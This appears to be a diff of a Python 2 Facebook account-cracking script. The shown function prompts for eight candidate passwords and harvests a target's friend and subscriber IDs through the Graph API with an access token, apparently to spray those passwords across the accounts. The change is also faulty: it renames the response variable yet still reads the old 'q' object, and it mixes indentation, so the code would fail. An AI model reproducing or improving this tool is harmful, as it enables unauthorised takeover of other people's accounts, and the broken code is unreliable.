@@ -297,15 +297,15 @@ def pilih_super():
                 pass7 = raw_input(' \033[1;92m[7]Password: ')
                 pass8 = raw_input(' \033[1;92m[8]Password: ')
 	try:
-		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
-		q = json.loads(r.text)
-		z = q['name']
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		op = json.loads(jok.text)
+		z = op['name']
 		os.system('clear')
 		logo()
 		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+q["name"]
 		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
 		for s in q['data']:
-			id.append(s['id'])
+		    id.append(s['id'])
 			
 		r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token='+ toket + '&limit=999999')
                 z = json.loads(r.text)
